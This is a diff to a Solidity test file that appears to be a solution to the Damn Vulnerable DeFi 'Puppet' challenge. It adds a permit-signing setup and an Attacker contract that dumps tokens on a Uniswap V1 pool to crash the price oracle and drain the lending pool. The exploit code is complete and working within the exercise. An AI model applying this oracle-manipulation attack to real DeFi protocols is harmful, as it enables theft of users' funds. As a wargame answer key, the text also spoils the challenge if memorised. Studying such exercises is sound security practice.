@@ -25,6 +25,7 @@ contract PuppetChallenge is Test {
     IUniswapV1Exchange uniswapV1Exchange;
     IUniswapV1Factory uniswapV1Factory;
 
+
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
         _;
@@ -70,6 +71,11 @@ contract PuppetChallenge is Test {
         token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
         token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
 
+        // bytes32 separator = token.DOMAIN_SEPARATOR();
+        // uint256 nonce = token.nonces(player);
+        // console.logBytes32(separator);
+        // console.log(nonce);
+
         vm.stopPrank();
     }
 
@@ -91,9 +97,57 @@ contract PuppetChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    Attacker public attackContract;
+    
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Step 1: Predict the address where the attacker contract will be deployed
+        // The address is determined using keccak256 hashing of the deployer's address and nonce.
+        // Here, nonce is 0 because this is the first contract being deployed from the player's address.
+        address predictedAddress = address(uint160(uint256(keccak256(abi.encodePacked(
+            bytes1(0xd6),             // RLP encoding prefix for the deployer's address
+            bytes1(0x94),             // RLP encoding prefix for the nonce
+            player,                   // The player's address (deployer)
+            bytes1(0x80)              // Nonce value = 0
+        )))));
+    
+        // Hardcoded DOMAIN_SEPARATOR for the token contract
+        // This separator is part of the EIP-712 signature process for the permit function.
+        bytes32 separator = 0x848001d4ba90c8d7fa503473554c6f8dc777cbf042f4c1bb88afcd6914009599;
+    
+        // Step 2: Construct the EIP-2612 digest for the permit function
+        // This digest combines the DOMAIN_SEPARATOR and the hashed permit data.
+        bytes32 digest = keccak256(
+            abi.encodePacked(
+                "\x19\x01",             // EIP-191 prefix
+                separator,              // DOMAIN_SEPARATOR (specific to the token contract)
+                keccak256(
+                    abi.encode(
+                        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"), // Permit type hash
+                        player,           // Owner of the tokens (player's address)
+                        predictedAddress, // Spender (attacker contract's predicted address)
+                        1000e18,          // Value to approve (1,000 tokens)
+                        0,                // Nonce for the player's account (starts at 0)
+                        type(uint256).max // Deadline for the permit (maximum possible value)
+                    )
+                )
+            )
+        );
+    
+        // Step 3: Sign the digest using the player's private key
+        // This creates an ECDSA signature consisting of v, r, and s components.
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
+    
+        // Step 4: Deploy the attacker contract
+        // Pass the token address, signature (v, r, s), and other necessary parameters to the attacker contract.
+        attackContract = new Attacker{value: player.balance}(
+            address(token),           // Token contract address
+            v, r, s,                  // ECDSA signature components
+            address(uniswapV1Exchange), // Uniswap V1 exchange address
+            recovery,                 // Address to send recovered tokens
+            address(lendingPool)      // Puppet lending pool address
+        );
     }
+
 
     // Utility function to calculate Uniswap prices
     function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
@@ -116,3 +170,59 @@ contract PuppetChallenge is Test {
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
 }
+
+contract Attacker {
+    /**
+     * @dev Attacker contract constructor. Executes the exploit by:
+     *      - Using the permit function to authorize the attacker contract
+     *      - Transferring tokens to the attacker contract
+     *      - Manipulating Uniswap prices and draining the lending pool
+     * @param tokenAddress Address of the DamnValuableToken contract
+     * @param v ECDSA signature component
+     * @param r ECDSA signature component
+     * @param s ECDSA signature component
+     * @param uniswapExchange Address of the Uniswap V1 exchange
+     * @param recoveryAddress Address where drained tokens will be sent
+     * @param lendingPoolAddress Address of the PuppetPool contract
+     */
+    constructor(
+        address tokenAddress,
+        uint8 v,
+        bytes32 r,
+        bytes32 s,
+        address uniswapExchange,
+        address recoveryAddress,
+        address lendingPoolAddress
+    ) payable {
+        // Step 1: Use the permit function to approve the attacker contract to spend tokens
+        DamnValuableToken(tokenAddress).permit(
+            msg.sender,             // Owner (signer)
+            address(this),          // Spender (attacker contract)
+            1000e18,                // Amount to approve
+            type(uint256).max,      // Deadline
+            v, r, s                 // ECDSA signature
+        );
+
+        // Step 2: Transfer approved tokens from the player to the attacker contract
+        DamnValuableToken(tokenAddress).transferFrom(msg.sender, address(this), 1000e18);
+
+        // Step 3: Approve the Uniswap exchange to spend tokens from the attacker contract
+        DamnValuableToken(tokenAddress).approve(uniswapExchange, 1000e18);
+
+        // Step 4: Swap tokens for ETH to manipulate the Uniswap price
+        IUniswapV1Exchange(uniswapExchange).tokenToEthSwapInput(1000e18, 1, type(uint256).max);
+
+        // Step 5: Borrow all tokens from the lending pool using manipulated prices
+        PuppetPool(lendingPoolAddress).borrow{value: address(this).balance}(100_000e18, recoveryAddress);
+    }
+
+    /**
+     * @notice Fallback function to accept ETH
+     */
+    fallback() external payable {}
+}
+
+
+
+
+
